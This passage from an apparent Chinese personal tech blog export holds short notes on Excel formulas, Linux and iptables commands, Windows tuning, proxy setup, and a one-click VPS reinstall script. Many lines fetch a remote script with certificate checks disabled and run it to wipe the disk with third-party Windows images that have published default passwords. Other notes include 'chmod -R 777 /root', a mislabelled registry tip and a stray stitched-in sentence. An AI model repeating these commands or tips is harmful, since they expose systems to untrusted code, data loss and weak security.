    <content><![CDATA[<h1 id="1-vlookup-查找对应的值"><a href="#1-vlookup-查找对应的值" class="headerlink" title="1. vlookup 查找对应的值"></a>1. vlookup 查找对应的值</h1><h1 id="2-lookup-输出查找一个值-LOOKUP-1-0-A2-A8-F3-C2-C8"><a href="#2-lookup-输出查找一个值-LOOKUP-1-0-A2-A8-F3-C2-C8" class="headerlink" title="2. lookup 输出查找一个值 LOOKUP(1,0&#x2F;(A2:A8&#x3D;F3),C2:C8)"></a>2. lookup 输出查找一个值 LOOKUP(1,0&#x2F;(A2:A8&#x3D;F3),C2:C8)</h1><h1 id="3-sumif-对满足条件的单元格求和"><a href="#3-sumif-对满足条件的单元格求和" class="headerlink" title="3. sumif 对满足条件的单元格求和"></a>3. sumif 对满足条件的单元格求和</h1><h1 id="4-countif-计算满足条件的单元格个数"><a href="#4-countif-计算满足条件的单元格个数" class="headerlink" title="4. countif 计算满足条件的单元格个数"></a>4. countif 计算满足条件的单元格个数</h1><h1 id="5-trim-清除空格"><a href="#5-trim-清除空格" class="headerlink" title="5. trim 清除空格"></a>5. trim 清除空格</h1><h1 id="6-mid-指定位置开始返回指定长度的字符串"><a href="#6-mid-指定位置开始返回指定长度的字符串" class="headerlink" title="6. mid 指定位置开始返回指定长度的字符串"></a>6. mid 指定位置开始返回指定长度的字符串</h1><h1 id="7-round-返回指定位数"><a href="#7-round-返回指定位数" class="headerlink" title="7. round 返回指定位数"></a>7. round 返回指定位数</h1><h1 id="8-and-or-true-false"><a href="#8-and-or-true-false" class="headerlink" title="8. and&#x2F;or true false"></a>8. and&#x2F;or true false</h1><h1 id="9-iferror-如果公式计算结果错误返回指定值，否则返回结果-Iferror（A2-B2-“错误”"><a href="#9-iferror-如果公式计算结果错误返回指定值，否则返回结果-Iferror（A2-B2-“错误”" class="headerlink" title="9. iferror 如果公式计算结果错误返回指定值，否则返回结果 Iferror（A2&#x2F;B2,“错误”)"></a>9. iferror 如果公式计算结果错误返回指定值，否则返回结果 Iferror（A2&#x2F;B2,“错误”)</h1><h1 id="10-if-满足返回一个值，不满足返回另一个值"><a href="#10-if-满足返回一个值，不满足返回另一个值" class="headerlink" title="10. if 满足返回一个值，不满足返回另一个值"></a>10. if 满足返回一个值，不满足返回另一个值</h1><h1 id="11-today（）今天日期"><a href="#11-today（）今天日期" class="headerlink" title="11. today（）今天日期"></a>11. today（）今天日期</h1><h1 id="12-rank-排序"><a href="#12-rank-排序" class="headerlink" title="12. rank 排序"></a>12. rank 排序</h1><h1 id="13-find"><a href="#13-find" class="headerlink" title="13. find"></a>13. find</h1><h1 id="14-datedif-算工龄-Y-M-D-YD-MD-YM"><a href="#14-datedif-算工龄-Y-M-D-YD-MD-YM" class="headerlink" title="14. datedif 算工龄 Y M D YD MD YM"></a>14. datedif 算工龄 Y M D YD MD YM</h1><p>文章内容和代码来源于网络，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>office</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title>centos 常用命令</title>
    <url>/posts/fa3e6a5/</url>
    <content><![CDATA[<h1 id="1-root管理员"><a href="#1-root管理员" class="headerlink" title="1.root管理员"></a>1.root管理员</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<h1 id="2-打开文件夹，返回上一级"><a href="#2-打开文件夹，返回上一级" class="headerlink" title="2.打开文件夹，返回上一级"></a>2.打开文件夹，返回上一级</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .. </span><br></pre></td></tr></table></figure>

<h1 id="3-对root及其下所有文件、文件夹授权"><a href="#3-对root及其下所有文件、文件夹授权" class="headerlink" title="3.对root及其下所有文件、文件夹授权"></a>3.对root及其下所有文件、文件夹授权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 /root</span><br></pre></td></tr></table></figure>

<h1 id="4-显示所在路径"><a href="#4-显示所在路径" class="headerlink" title="4.显示所在路径"></a>4.显示所在路径</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<h1 id="5-显示所在位置的所有文件夹"><a href="#5-显示所在位置的所有文件夹" class="headerlink" title="5.显示所在位置的所有文件夹"></a>5.显示所在位置的所有文件夹</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure>

<h1 id="6-删除直接rm就可以，不过要加两个参数-rf-即：rm-rf-目录名字"><a href="#6-删除直接rm就可以，不过要加两个参数-rf-即：rm-rf-目录名字" class="headerlink" title="6.删除直接rm就可以，不过要加两个参数-rf 即：rm -rf 目录名字"></a>6.删除直接rm就可以，不过要加两个参数-rf 即：rm -rf 目录名字</h1><p>-r 就是向下递归，不管有多少级目录，一并删除<br>-f 就是直接强行删除，不作任何提示的意思</p>
<p>强制删除&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access目录以及其下所有文件、文件夹<br>强制删除&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log这个文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /var/log/httpd/access</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /var/log/httpd/access.log</span><br></pre></td></tr></table></figure>

<h1 id="7-移动文件：mv-文件名-移动目的地文件名"><a href="#7-移动文件：mv-文件名-移动目的地文件名" class="headerlink" title="7.移动文件：mv 文件名 移动目的地文件名"></a>7.移动文件：mv 文件名 移动目的地文件名</h1><p>重命名文件：mv 文件名 修改后的文件名<br>示例（oldfilename为旧文件名，newfilename为新文件名）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> oldfilename newfilename</span><br></pre></td></tr></table></figure>

<h1 id="8-vim-vi-nano"><a href="#8-vim-vi-nano" class="headerlink" title="8.vim , vi , nano"></a>8.vim , vi , nano</h1><p>这一组的命令，我们介绍了文件编辑工具。这里介绍三种编辑工具，各有所长，根据自己的喜好来选择。我比较倾向于组合使用，发挥在Linux系统上文件编辑的最高效率。<br>vim &#x2F; vi<br>它们都是多模式编辑器，不同的是vim 是vi的升级版本，它不仅兼容vi的所有指令，而且还有一些新的特性在里面。所以在这里只要学习vim的基本操作就ok了，本节命令更适合实践演练和操作，故只推荐一个慕课（点击这里），和学习的参考文档（点击这里）。<br>nano<br>nano：nano是一个字符终端的文本编辑器，有点像DOS下的editor程序。它比vi&#x2F;vim要简单得多，比较适合Linux初学者使用。某些Linux发行版的默认编辑器就是nano。<br>如果你没有安装nano编辑器的话，可以使用yum进行安装：yum -y install nano。</p>
<h1 id="9-wget"><a href="#9-wget" class="headerlink" title="9.wget"></a>9.wget</h1><p>wget：wget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
<h1 id="10-创建文件"><a href="#10-创建文件" class="headerlink" title="10.创建文件"></a>10.创建文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span></span><br></pre></td></tr></table></figure>
<h1 id="11-编辑文件"><a href="#11-编辑文件" class="headerlink" title="11.编辑文件"></a>11.编辑文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line"></span><br><span class="line">nano</span><br></pre></td></tr></table></figure>
<p>保存退出<br>按esc， 然后输入 :wq ，回车退出 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure>

<p>不保存直接退出<br>敲击esc，然后输入:q!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:q!</span><br></pre></td></tr></table></figure>
<h1 id="CentOS7-安装curl命令"><a href="#CentOS7-安装curl命令" class="headerlink" title="CentOS7 安装curl命令"></a>CentOS7 安装curl命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#直接使用yum安装</span><br><span class="line"> yum -y install curl</span><br><span class="line">#查看是否安装成功</span><br><span class="line">curl --version</span><br><span class="line">#测试一下是否能够使用</span><br><span class="line">curl www.baidu.com</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu iptables 开放端口</title>
    <url>/posts/e9806297/</url>
    <content><![CDATA[<h1 id="1-安装iptables（一般情况，ubuntu安装好的时候，iptables会被安装上），使用以下命令："><a href="#1-安装iptables（一般情况，ubuntu安装好的时候，iptables会被安装上），使用以下命令：" class="headerlink" title="1.安装iptables（一般情况，ubuntu安装好的时候，iptables会被安装上），使用以下命令："></a>1.安装iptables（一般情况，ubuntu安装好的时候，iptables会被安装上），使用以下命令：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install iptables</span><br></pre></td></tr></table></figure>
<h1 id="2-安装完后，开放2181端口，使用以下命令："><a href="#2-安装完后，开放2181端口，使用以下命令：" class="headerlink" title="2.安装完后，开放2181端口，使用以下命令："></a>2.安装完后，开放2181端口，使用以下命令：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 2181 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h1 id="3-保存规则"><a href="#3-保存规则" class="headerlink" title="3.保存规则"></a>3.保存规则</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save</span><br></pre></td></tr></table></figure>

<p>这样可以开放指定的端口，但是如果服务器重启，不会保存，所以我们需要对上述规则进行一下持续化操作</p>
<h1 id="4-持续化规则：使用iptables-persistent"><a href="#4-持续化规则：使用iptables-persistent" class="headerlink" title="4.持续化规则：使用iptables-persistent"></a>4.持续化规则：使用iptables-persistent</h1><h2 id="4-1首先安装iptables-persistent"><a href="#4-1首先安装iptables-persistent" class="headerlink" title="4.1首先安装iptables-persistent"></a>4.1首先安装iptables-persistent</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install iptables-persistent</span><br></pre></td></tr></table></figure>
<h2 id="4-2-永久保存规则"><a href="#4-2-永久保存规则" class="headerlink" title="4.2.永久保存规则"></a>4.2.永久保存规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netfilter-persistent save</span><br><span class="line">netfilter-persistent reload</span><br></pre></td></tr></table></figure>
<p>这样就可以永久打开需要的端口。</p>
<p>文章内容和代码来源于网络<a href="https://www.cnblogs.com/Yatces/p/10513599.html">ubuntu开放端口</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle cloud arm 4c24g ubuntu 备忘录</title>
    <url>/posts/8745f252/</url>
    <content><![CDATA[<h1 id="1-系统一定要用-Ubuntu-20-04，AMD-的-Ubuntu-22-04-私钥也不能用"><a href="#1-系统一定要用-Ubuntu-20-04，AMD-的-Ubuntu-22-04-私钥也不能用" class="headerlink" title="1.系统一定要用 Ubuntu 20.04，AMD 的 Ubuntu 22.04 私钥也不能用"></a>1.系统一定要用 Ubuntu 20.04，AMD 的 Ubuntu 22.04 私钥也不能用</h1><h1 id="2-入站规则-0-0-0-0-0-所有协议"><a href="#2-入站规则-0-0-0-0-0-所有协议" class="headerlink" title="2.入站规则 0.0.0.0&#x2F;0 所有协议"></a>2.入站规则 0.0.0.0&#x2F;0 所有协议</h1><h1 id="3-Ubuntu-ufw默认关闭，但是iptables要放行相应端口"><a href="#3-Ubuntu-ufw默认关闭，但是iptables要放行相应端口" class="headerlink" title="3.Ubuntu ufw默认关闭，但是iptables要放行相应端口"></a>3.Ubuntu ufw默认关闭，但是iptables要放行相应端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开放2181端口</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 2181 -j ACCEPT</span><br><span class="line"><span class="comment">#保存规则</span></span><br><span class="line">iptables-save</span><br><span class="line"><span class="comment">#永久保存规则</span></span><br><span class="line">netfilter-persistent save</span><br><span class="line">netfilter-persistent reload</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>优化 windows 性能</title>
    <url>/posts/fe060592/</url>
    <content><![CDATA[<h1 id="1-最佳性能视觉"><a href="#1-最佳性能视觉" class="headerlink" title="1.最佳性能视觉"></a>1.最佳性能视觉</h1><ul>
<li>Windows 7 计算机右键属性——更改设置——高级——性能——设置</li>
<li>在窗口和按钮上使用视觉样式打钩（win7）</li>
<li>Windows10 设置——系统——系统信息——高级系统设置——高级——性能设置——视觉效果——调整为最佳性能</li>
<li>平滑屏幕字体边缘和显示缩略图，而不是显示图标打钩（win7,win10,win11）</li>
</ul>
<h1 id="2-关闭虚拟内存"><a href="#2-关闭虚拟内存" class="headerlink" title="2.关闭虚拟内存"></a>2.关闭虚拟内存</h1><ul>
<li>设置——系统——系统信息——高级系统设置——高级——性能设置——高级——虚拟内存——更改——选驱动器——无分页文件——设置——确定</li>
<li>或者 \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management DisablePagingExecutive 数值数据设为1</li>
</ul>
<h1 id="3-电源状态"><a href="#3-电源状态" class="headerlink" title="3.电源状态"></a>3.电源状态</h1><ul>
<li>控制面板——查看方式——大图标——电源选项——高性能——更改计划设置——更改高级电源设置</li>
<li>硬盘——在此时间后关闭硬盘——9999999分钟</li>
<li>处理器电源管理——最小处理器状态——设置：100%</li>
</ul>
<h1 id="4-开机启动项"><a href="#4-开机启动项" class="headerlink" title="4.开机启动项"></a>4.开机启动项</h1><ul>
<li>开始——搜msconfig——系统配置——启动——关闭不必要的启动项</li>
</ul>
<h1 id="5-最大化预加载到内存的文件数量：以管理员身份运行-PowerShell——mmagent——set-mmagent——8192（8192M-8G）"><a href="#5-最大化预加载到内存的文件数量：以管理员身份运行-PowerShell——mmagent——set-mmagent——8192（8192M-8G）" class="headerlink" title="5. 最大化预加载到内存的文件数量：以管理员身份运行 PowerShell——mmagent——set-mmagent——8192（8192M&#x3D;8G）"></a>5. 最大化预加载到内存的文件数量：以管理员身份运行 PowerShell——mmagent——set-mmagent——8192（8192M&#x3D;8G）</h1>]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>v2rayn 添加规则和 telegram 使用 socks5 代理</title>
    <url>/posts/f16462d7/</url>
    <content><![CDATA[<h1 id="1-设置——路由设置——双击进去规则——规则功能——添加规则——选直连还是代理——填域名——确定"><a href="#1-设置——路由设置——双击进去规则——规则功能——添加规则——选直连还是代理——填域名——确定" class="headerlink" title="1.设置——路由设置——双击进去规则——规则功能——添加规则——选直连还是代理——填域名——确定"></a>1.设置——路由设置——双击进去规则——规则功能——添加规则——选直连还是代理——填域名——确定</h1><h2 id="2-telegram代理参数如下-使用全局代理模式，简单粗暴，为电报创建一个本地代理，使其能够被代理工具代理。"><a href="#2-telegram代理参数如下-使用全局代理模式，简单粗暴，为电报创建一个本地代理，使其能够被代理工具代理。" class="headerlink" title="2.telegram代理参数如下:使用全局代理模式，简单粗暴，为电报创建一个本地代理，使其能够被代理工具代理。"></a>2.telegram代理参数如下:使用全局代理模式，简单粗暴，为电报创建一个本地代理，使其能够被代理工具代理。</h2><p>打开电报的设置选项Windows 版请点击左上角三道杠，然后选择设置，编译安装部署可能会比较麻烦，具体按照下面的教程操作即可，个人建议大家使用上面docker方法部署。需要安装一些编译的必要工具，以及openssl和zlib的开发包，不同系统需要安装的工具不同以你自己的服务器系统为准。</p>
<p>Mac 版小飞机监听端口一般是1086，可在小飞机偏好设置中查看，创建本地 SOCKS5 代理，服务器地址填写 127.0.0.1本地网关，端口号为代理工具的本地监听端口，此处为 Windows版本，默认10808。</p>
<p>Telegram Desktop 客户端→左上角三短线→设置→高级→网络和代理→代理类型→勾选使用系统代理或使用自定义代理。</p>
<p>使用自定义代理添加方法: 添加代理→SOCKS5&#x2F;HTTP→服务器: 127.0.0.1, 端口: 端口需查看你的代理软件SS&#x2F;SSR&#x2F;Clash for Windows&#x2F;V2Ray, 不需要填写用户名和密码。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>proxy</category>
        <category>v2ray</category>
        <category>telegram</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>proxy</tag>
        <tag>v2ray</tag>
        <tag>telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle cloud dd windows</title>
    <url>/posts/85162a5c/</url>
    <content><![CDATA[<p>一个傻瓜式一键dd安装windows系统脚本！！！</p>
<p>说明</p>
<p>无限制全自动dd安装windows<br>突破没有VNC,没有救援模式,内存比dd包小的限制<br>使用Debian Live CD中的busybox做中间媒介,经过复杂的处理使本机的网络参数传进Windows操作系统中<br>即使没有DHCP能够让Windows获取网络参数,也能让Windows操作系统在开机的第一时间能够连通网络<br>特别注意：OpenVZ构架不适用</p>
<p>安装运行库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Debian/Ubuntu:</span></span><br><span class="line">apt-get install -y xz-utils openssl gawk file</span><br><span class="line"></span><br><span class="line"><span class="comment">#RedHat/CentOS:</span></span><br><span class="line">yum install -y xz openssl gawk file</span><br></pre></td></tr></table></figure>
<p>如果出现错误，运行以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Debian/Ubuntu:</span></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment">#RedHat/CentOS:</span></span><br><span class="line">yum update</span><br></pre></td></tr></table></figure>
<p>一键脚本</p>
<p>示例脚本，补全DD包直连地址后运行即可；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;[Windows dd包直连地址]&#x27;</span></span><br></pre></td></tr></table></figure>
<p>精简版DD包</p>
<p>选择好版本，输入以下一键脚本即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DD Windows Server 2003 32位 精简版 [账户Administrator密码cxthhhhh.com]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win_Server2003_86_Administrator_cxthhhhh.com.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2008 R2 64位 精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win_Server2008R2_sp1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2012 R2 64位 精简版 [账户Administrator密码WinSrv2012r2x64-Chinese]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win_Server2012R2_64_Administrator_WinSrv2012r2x64-Chinese.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2019 Datacenter 64位 精简版 [账户Administrator密码WinSrv2019dc-Chinese]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win_Server2019_64_Administrator_WinSrv2019dc-Chinese.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows7 32位 精简版 [账户Administrator密码Windows7x86-Chinese]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win7_86_Administrator_Windows7x86-Chinese.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows7 sp1 64位 企业精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win7_sp1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#DD Windows8.1 64位 专业精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win8.1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#DD Windows8.1 64位 适量精简版 [账户Administrator密码Vicer]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win8.1_64_Administrator_Vicer.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows10 2016LTSB 64位 企业深度精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win10_2016LTSB_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows10 2019LTSC 64位 企业适量精简版 [账户Administrator密码Vicer]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Win10_2019LTSC_64_Administrator_Vicer.gz&#x27;</span></span><br></pre></td></tr></table></figure>
<p>完整版DD包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DD Windows Server 2012 R2 Datacenter 64位 完整版 [账户administrator密码Password147]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/cn_windows2012r2_administrator_Password147.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2016 Datacenter 64位 完整版 [账户administrator密码Password147]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/cn_windows2016_administrator_Password147.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2019 Datacenter 64位 完整版 [账户administrator密码Password147]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/cn_windows2019_administrator_Password147.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows7 sp1 64位 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/Win7_sp1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows8.1 64位 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/Win8.1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows10 LTSC 64位 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Whole/Win10_LTSC_64_Administrator_nat.ee.gz&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Oracle甲骨文</p>
<p>此DD包仅适用于Oracle甲骨文DD Win使用 （注意：不适用于新出的ARM框架机型）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DD Windows7 sp1 64位 企业精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Oracle_Win7_sp1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows8.1 64位 企业精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Oracle_Win8.1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows10 2016LTSB 64位 企业深度精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Oracle_Win10_2016LTSB_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2008 R2 64位 精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Oracle_Win_Server2008R2_sp1_64_Administrator_nat.ee.gz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DD Windows Server 2012 R2 64位 精简版 [账户Administrator密码nat.ee]</span></span><br><span class="line">wget --no-check-certificate -qO InstallNET.sh <span class="string">&#x27;https://moeclub.org/attachment/LinuxShell/InstallNET.sh&#x27;</span> &amp;&amp; bash InstallNET.sh -<span class="built_in">dd</span> <span class="string">&#x27;https://oss.sunpma.com/Windows/Oracle_Win_Server2012R2_64_Administrator_nat.ee.gz&#x27;</span></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于<a href="https://yangmao.info/122169.html">DD Windows 一键dd脚本，包含GCP&#x2F;谷歌云&#x2F;Oracle&#x2F;甲骨文</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>linux 之文件目录类相关的指令</title>
    <url>/posts/992b3d18/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示当前路径的绝对路径</span></span><br><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>
